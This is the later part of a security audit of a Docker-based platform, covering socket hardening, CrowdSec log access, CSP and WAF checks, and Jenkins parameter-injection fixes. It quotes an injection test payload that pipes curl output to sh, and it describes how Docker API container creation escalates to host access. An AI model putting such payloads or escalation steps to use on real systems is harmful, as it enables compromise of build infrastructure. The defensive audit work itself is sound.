The three exporters and the six vault-agents are the easy wins — they write nothing but their
render destination, which is already a separate tmpfs volume. `prometheus`, `alertmanager` and
`grafana` write only into their named data volumes, so `read_only: true` plus a small `/tmp` tmpfs
should hold. `apisix` and `keycloak` genuinely need writable runtime dirs; leave them.

Fifteen services, roughly nine lines of change, and `checkov` (already in pre-commit) has a check for
exactly this.

### 3.5 — Front the Docker socket, do not keep labelling it

Three consumers mount it: `jenkins` (read-write, B-F2), `crowdsec` and `dockhand` (both `:ro`,
which per N12 restricts nothing). Under rootless, that socket is not root-on-the-host, but it *is*
full control of every container and volume this platform runs — on prod that includes `docker exec`
into `openbao` and `db`.

- **Jenkins** — the socket is needed for `docker build`/`push`. `tecnativa/docker-socket-proxy` with
  only `BUILD=1 IMAGES=1 POST=1` scoped to what the pipelines actually call is the low-effort
  version; kaniko or buildah-in-userns is the version that removes the need entirely.
- **CrowdSec** — needs the Docker API only to *read* logs. `CONTAINERS=1 INFO=1` on a proxy, nothing
  else. It parses externally-influenced HTTP log data, so this is the one where a parser bug turns
  into container control.
- **dockhand** — genuinely needs the full API, which is what it is for. The fix here is not the
  socket, it is that authentication is a **post-deploy checklist item** rather than a default, on a
  service that binds to the Tailscale IP on **prod**. Script auth enablement into first bring-up.

### 3.6 — Confirm CrowdSec can actually read the host logs it is configured to parse

`other/services/crowdsec/docker-compose.yml:38-40` bind-mounts `/var/log/auth.log`, `/var/log/syslog`
and `/var/log/kern.log` read-only, and `acquis.yaml` declares all three as sources for the
`crowdsecurity/linux` and `crowdsecurity/sshd` collections. On Ubuntu those files are typically
`0640 root:adm`. Under **rootless** Docker the container's uids map through the deploy user's subuid
range, so host-root-owned files appear as `nobody` and mode 640 grants the container nothing. If so,
those three acquisition sources are silently reading nothing and the SSH brute-force detection this
stack advertises is inert — with no error, because CrowdSec logs an unreadable source at warn level
and carries on.

**Marked as verify, not a finding** — it depends on host file modes I did not check.

```bash
docker exec crowdsec sh -c 'head -1 /var/log/host/auth.log' ; echo "exit=$?"
docker exec crowdsec cscli metrics | grep -A5 'Acquisition'      # want non-zero lines read per source
```

If it comes back empty, the fix is `setfacl -m u:<deploy-user>:r /var/log/auth.log` plus a logrotate
`create` mode that preserves it, or shipping those logs through the Docker API source instead.

### 3.7 — Confirm the RootlessKit port driver preserves source IPs

Rootless Docker's default port driver (`builtin`) is fast but **does not preserve the source IP** —
published-port traffic arrives at the container from the internal gateway address. `slirp4netns`
preserves it. This decides whether APISIX's `limit-count`/`limit-conn` keys and CrowdSec's bans see
real clients or one shared bucket for everything arriving on a published port.

Prod is largely insulated (traffic reaches APISIX container-to-container from `cloudflared`, not
through a published port, and `CF-Connecting-IP` carries the truth at L7). Staging, where NPM fronts
APISIX, is the case to check.

```bash
systemctl --user show docker --property=Environment | tr ' ' '\n' | grep ROOTLESSKIT
# to change: ~/.config/systemd/user/docker.service.d/override.conf
#   [Service]
#   Environment=DOCKERD_ROOTLESS_ROOTLESSKIT_PORT_DRIVER=slirp4netns
```

---

## Part 4 — Checked and clean

Verified this pass, no finding. Recorded so the next reviewer does not re-derive it.

**Backend.** No `eval`/`exec`/`pickle`/`subprocess`/`os.system`/`shell=True`/`yaml.load` anywhere in
`src/`. All SQL through SQLAlchemy with bound parameters; the two `text()` uses in
`worker/rag_outbox_loop.py` take `:params`. JWT: `verify_aud: True` against
`oauth.keycloak.admin_client_id`, issuer allowlist checked separately, RS256 pinned, RFC 7662
introspection fail-closed at 503. `ssl_verify` defaults `True` and is no longer overridden in prod or
staging `.env` (BR-SEC-021 closed). CSRF enabled by default, cookie secure + httpOnly + SameSite=lax,
no Bearer exemption in the code. `debug` defaults `False`; Swagger, ReDoc and `/openapi.json` all
default off. `RequestBodySizeLimitMiddleware` is pure-ASGI and counts bytes off `receive`, so chunked
uploads are covered. Prompt injection closed — `ReviewChatMessage.role` is
`Literal["student","ai"]` and `_DOMAIN_TO_LLM_ROLE` is lookup-only with an `in` guard. Image serving
is regex-bounded (`^[a-zA-Z0-9_\-]{1,70}\.(png|jpg|webp)$`) with the lenient-auth exemption documented
at the call site.

**Frontend.** CSP is enforced in production with a per-request nonce plus `'strict-dynamic'`,
`object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `frame-ancestors 'none'`,
`connect-src 'self'`, and `upgrade-insecure-requests`; the two relaxations
(`style-src-attr 'unsafe-inline'`, `'wasm-unsafe-eval'`) are documented in-file with reasons. The
`/csp-report` collector caps its body by streaming, never 5xxs, and logs structured JSON. No
`dangerouslySetInnerHTML`, no `eval`, no `new Function`, no raw `innerHTML`. `localStorage` holds only
the role label and an active-child id — no tokens. The one `target="_blank"` carries
`rel="noopener noreferrer"`. `frameHostnames()` strips `;` before interpolation.

**Gateway/WAF.** CRS at **4.25.1 LTS** on Coraza **3.7.0** — CVE-2026-21876 closed. The exclusion
scoping problem that was the 2026-07-27 central finding is genuinely fixed: `03-secured-api.json`
now uses `ctl:ruleRemoveTargetById=<id>;ARGS_POST:/^json\.(...)$/` throughout, with `931130` the one
documented `ruleRemoveById` holdout and a written reason. `12-api-exams-static.json` and
`18-api-exam-session-submit.json` use `SecRuleUpdateTargetByTag … "!ARGS_POST:/field/"`. Gateway
Dockerfile pins the Go builder by multi-arch index digest and TinyGo by SHA256, with a recorded
war-story about getting the digest kind wrong.

**Secrets.** Six vault-agent sidecars, each with its own mTLS identity cert on its own volume, each
rendering to a **`driver_opts: type: tmpfs`** volume (`common/docker-compose.yml:1269-1300`) — so the
agent configs' "secrets never touch disk" claim is true, which I checked rather than assumed. No
secret values in any of the seven committed `.env*` paths (`prod/.env` is entirely image tags, ports,
model specs and non-secret config). `exit_on_retry_failure = true` on every agent; every consumer
gates on `service_healthy`.

**CI gates that do run.** `dev-isolation-check.sh` (ALLOW_NONE_AUTHENTICATION, start-dev, sensitive
published ports, `0.0.0.0/0` admin CIDR, NET_RAW/NET_ADMIN, `enable_admin_ui: true`),
`check-image-pins.sh`, `ip-restriction-deny-by-default-check.sh`,
`route-whitelist-preservation-check.sh`, `route-prune-check.sh`, `manifest-contract-check.sh`,
`service-name-validation-check.sh`, `audit-apisix-admin-key-consumers.sh`,
`full-plaintext-elimination-scan.sh`, `plaintext-residue-scan.sh` — all wired into
`Jenkinsfile`'s Validation stage.

**Pre-commit.** gitleaks, detect-secrets, detect-private-key, shellcheck, shfmt, yamllint, hadolint,
checkov, plus two local hooks — one forbidding hardcoded Tailscale CGNAT host addresses (with a
carefully-reasoned `(?!/10\b)` so the range itself survives) and one blocking `Co-Authored-By`. The
"move gitleaks left" follow-up from 2026-07-02 is done.

**Tailscale ACL.** No `*:*` anywhere. `tag:in-dev1`/`tag:in-dev2` have no path to `tag:prod` at all.
Prod SSH is behind the separate `tag:prod-ssh`. `9180` is absent from both `tag:prod` and
`tag:staging`. Caveat unchanged from prior passes: this policy is applied by hand in the Tailscale
Admin Console, so the repo copy is intent, not proof.

**Registry / SonarQube / NPM.** Registry is htpasswd-authenticated, loopback-published, `read_only`,
`cap_drop: ALL`, digest- or version-pinned. SonarQube pins `user: 1000:1000`, drops all caps on the
DB with a minimal `cap_add`, publishes on loopback only. NPM drops all caps with a minimal add set
and `privileged: false`.

---

## Part 5 — Suggested order

1. **N1, N2** — four regex lines and two `withEnv` blocks. These are the only findings that reach
   production from an unprivileged position.
2. **B-F2** (Jenkins socket) — the reason N1/N2 are HIGH rather than MEDIUM. Even the interim
   `docker-socket-proxy` step materially shrinks the blast radius.
3. **N5** — one line, prevents an irreversible data loss.
4. **N3** — before the `monitoring` profile ships anywhere. It is free right now and expensive later.
5. **N6** — wire the four checks, then add the meta-check so there is no fifth time.
6. **N7, N8** — segment the tunnel; narrow `set_real_ip_from`. Verify N8 with the one-line `curl`
   first.
7. **N4** — checksum the four release downloads and the `uv` installer; pin the pip installs.
8. **§3.1–3.3** — the rootless verifications. Cheap to run, and 3.2 decides whether ~40 committed
   resource limits are real.
9. **A-F4, A-F5, A-F8, A-F9** — carried-over MEDIUM/LOWs, each a small diff with a fix already
   written in pass A.
10. **N9–N13, §3.4** — hygiene.

## Part 6 — Open questions for the operator

Six items this pass could not close from a repo checkout. Each is one command.

1. **N8** — does the `X-Real-IP` spoof reach the staging Keycloak admin console? (curl above)
2. **§3.2** — is cgroup delegation on? If not, no `mem_limit`/`pids_limit` in this repo has ever
   applied.
3. **§3.3** — is the rootful `docker.service` masked on staging and prod?
4. **§3.6** — can CrowdSec actually read `/var/log/host/auth.log`?
5. **§3.7** — which RootlessKit port driver is in use on staging?
6. **N7** — what hostnames does the Cloudflare tunnel currently map, and to which origins? Nothing in
   this repo can answer that, which is the finding.

---

## Post-review resolutions (2026-08-20)

Findings above are left exactly as written. This section records what happened to them.

| Finding | Resolution |
|---|---|
| **N1** (frontend Jenkinsfile param injection) | **FIXED.** `haisir-frontend/Jenkinsfile` gains a `Validate Parameters` stage gating `TAG` on `^[A-Za-z0-9._-]+$` and `NEXT_PUBLIC_BACKEND_URL` on `^https:\/\/[A-Za-z0-9.-]+(:[0-9]{1,5})?$` (https only, no path — a bad value here ships in the client bundle). All three downstream uses converted from Groovy interpolation to `withEnv` + single-quoted `sh`: the `docker build` (`:291`), `docker save` (`:310`), and the `docker tag`/`docker push` inside `withCredentials` (`:391`). `grep 'params\.' Jenkinsfile` now returns only the validation stage, three `withEnv` bindings, and three `echo`s — **no `params.` remains inside any `sh` body**. Mirrors `haisir-backend/Jenkinsfile:22-30` exactly. |
| **N2** (`Jenkinsfile.integration-dast` STAGING_URL) | **FIXED at the parameter, deliberately not at the eleven call sites.** New `Validate Parameters` stage gates `STAGING_URL` on `^https:\/\/[A-Za-z0-9.-]+(:[0-9]{1,5})?$` — scheme, host, optional port, nothing else: no quote, space, `;`, `\|`, `$`, backtick or path can survive it, so the value is structurally inert no matter how it is interpolated. A second gate rejects `haisir.in`/`www.haisir.in`, enforcing the warning the parameter's own description already carried ("Do NOT use the prod URL — active scan sends real attack payloads"), which until now was honour-system only. **The eleven `sh """..."""` bodies were left as GStrings.** Converting them means un-escaping roughly forty `\$` sequences across five stages in a pipeline that cannot be executed here; the gate is the root-cause fix and the rewrite is defense-in-depth with a real chance of shipping a broken nightly job. Worth doing later with a live Jenkins to verify against — recorded, not silently skipped. |
| **N5** (`docker system prune --volumes` on the shared CI daemon) | **FIXED, without regressing the disk problem the original change solved.** The in-place comment explained why a plain `docker image prune --filter until=24h` was abandoned — it prunes only *dangling* images and reclaimed 0B. A straight revert would have re-broken that. Now `docker image prune -a -f --filter "until=24h"` plus `docker container prune -f --filter "until=24h"`, alongside the existing `docker builder prune -a -f`: `-a` prunes tagged-but-unreferenced images, which is what the comment actually wanted, while Docker itself refuses to remove an image any container references, so the registry/SonarQube/Jenkins images are safe whether those services are up or down. `--volumes` is gone, and the comment now names why it must not come back — it deletes every volume no *running* container holds, so one backend build fired while SonarQube or the registry happened to be down would have destroyed `sonarqube-db-data` or `registry-data`, silently (`\|\| true`) and irreversibly. |

**Verification performed.** Brace/paren/bracket balance checked outside strings and comments on all
three edited Jenkinsfiles — all balanced. All three new regexes unit-tested against benign values
(`v2026.7-staging`, `https://staging.haisir.in`, `https://staging.haisir.in:8443`) and against the
injection payloads from N1/N2 (`x"; curl http://a|sh; echo "`, `$(id)`, backticks, `;`, spaces, a
trailing path, and plain `http://`) — every benign value accepted, every payload rejected, and the
prod-denial gate accepts `haisir.in`/`www.haisir.in`/`haisir.in:443` while passing
`staging.haisir.in` through.

**Not verified:** no Groovy or Java runtime is available here, so none of the three files was parsed
by an actual Groovy compiler. Run the declarative linter against a live Jenkins before the next
build relies on them:

```
curl -X POST -u <user>:<token> -F "jenkinsfile=<Jenkinsfile" https://<jenkins>/pipeline-model-converter/validate
```

Everything else in this document is unchanged and open.

### Second round (2026-08-20): N3 fixed, B-F2 investigated and re-scoped

| Finding | Resolution |
|---|---|
| **N3** (`node-exporter` host root + host PID namespace) | **FIXED.** `pid: host` and the `/:/rootfs:ro` bind are both gone from `common/docker-compose.yml`; `--path.rootfs` is replaced by `--no-collector.filesystem`. `/proc` and `/sys` stay — they are what the cpu/meminfo/netdev/loadavg collectors actually read. Neither removed setting was load-bearing: `pid: host` only serves `--collector.processes`, which is not enabled anywhere, and the root bind only fed the filesystem collector, which is now off (host disk usage belongs on the host's own monitoring, not on a container holding a view of the whole filesystem). **Guarded:** `dev-isolation-check.sh` gains checks 7 (`pid: host`) and 8 (a volume entry whose source is exactly `/`), both already wired into CI via the *Dev Isolation Check* stage. Verified three ways — baseline PASS, then an injected probe compose file with both patterns FAILs with exactly 2 violations naming both, then PASS again after removal. `- /proc:/host/proc:ro` correctly does **not** trip check 8. `yamllint -c .yamllint.yml` warning count unchanged at 10 (all pre-existing, none in the edited region); `shellcheck --severity=warning` clean on the modified test. |
| **B-F2** (Jenkins RW docker socket) | **NOT FIXED — no correct repo-side fix exists, and the recommended one is wrong. See below.** |

#### B-F2: correcting this review's own recommendation

Pass B's fix line for F2 — and the echo of it in this document's §3.5 — says to "front the socket
with a scoped proxy (e.g. `tecnativa/docker-socket-proxy`) limited to the specific build/push/pull
verbs Jenkins needs." **That does not work for this consumer, and recording it as the fix would be
worse than leaving the finding open**, because a proxy would look like a control while changing
nothing.

I enumerated every Docker verb across all five pipelines
(`Jenkinsfile`, `Jenkinsfile.deploy`, `Jenkinsfile.integration-dast`, `haisir-backend/Jenkinsfile`,
`haisir-frontend/Jenkinsfile`, `gateway-docker/Jenkinsfile`):

`build` ×4, `run` ×6, `rm` ×6, `cp` ×4, `tag` ×3, `save` ×3, `push` ×3, `login` ×3,
`volume create`/`volume rm` ×2 each, `stop` ×2, `inspect` ×2, `pull`, `rmi`,
`image`/`container`/`builder`/`system prune`, `compose config`.

`docker-socket-proxy` gates by API path category. Supporting that set requires at minimum
`POST=1 CONTAINERS=1 IMAGES=1 BUILD=1 VOLUMES=1`. But `POST=1` plus `CONTAINERS=1` permits
`POST /containers/create`, whose body accepts `HostConfig.Privileged: true` and
`HostConfig.Binds: ["/:/host"]`. An attacker with that much proxy is one API call from the same
place they started. The proxy is only a real boundary for a consumer that needs **no POST at all** —
which is exactly CrowdSec's case (`CONTAINERS=1`, read container list + logs, nothing else) and
exactly not Jenkins's.

**The two fixes that would actually work**, neither of which I am willing to ship untested into a
working tree from here:

1. **A second, dedicated rootless daemon for CI builds**, under a different host user with its own
   socket, leaving the registry / SonarQube / `jenkins_home` daemon out of reach. This is the
   correct answer and it is a *host* change, not a repo change — and this repo has no codified host
   baseline to put it in (see §3, opening note).
2. **Rootless BuildKit for build+push, plus a scoped proxy for the remaining container lifecycle.**
   Removes the socket from the build path entirely, but touches all three build pipelines and the
   ZAP/test-db stages, and needs a live Jenkins to validate.

Note that plain DinD is *not* on this list: it requires `privileged: true` on the outer container,
which trips this project's own `security-audit.sh` `DOCKER-01` at CRITICAL, correctly.

**What changed today that matters more than any of this.** B-F2 is a blast-radius multiplier, not an
entry point — something else has to give an attacker execution on the agent first. Before today
there were three unvalidated free-text build parameters doing exactly that (N1 ×2, N2 ×1). Those are
now closed, which moves B-F2 from "reachable by anyone who can trigger a build" back to "reachable
by anyone who already has the agent."

**Therefore the highest-value remaining control is access control on the jobs, and it is already
half-built.** `other/services/jenkins/Dockerfile:151` installs `matrix-auth`, and
`Jenkinsfile.deploy`'s own header (`:33-35`) says: *"Restrict who can trigger this job — a
parameterized build is shell execution by proxy; Anonymous/Authenticated Users must not hold
Job/Build on this job."* That is a Jenkins runtime setting, not a repo file, so nothing in this
audit can confirm it was ever applied. **Confirm it, for all five jobs, before treating B-F2 as
merely accepted:** Manage Jenkins → Security → Authorization → Project-based Matrix Authorization,
and verify neither `Anonymous` nor `Authenticated Users` holds `Job/Build` or `Job/Configure`.

**Disposition:** B-F2 stays **open**, re-scoped, with the proxy recommendation formally withdrawn.
Re-rate it against option 1 above once a host baseline exists to carry it.
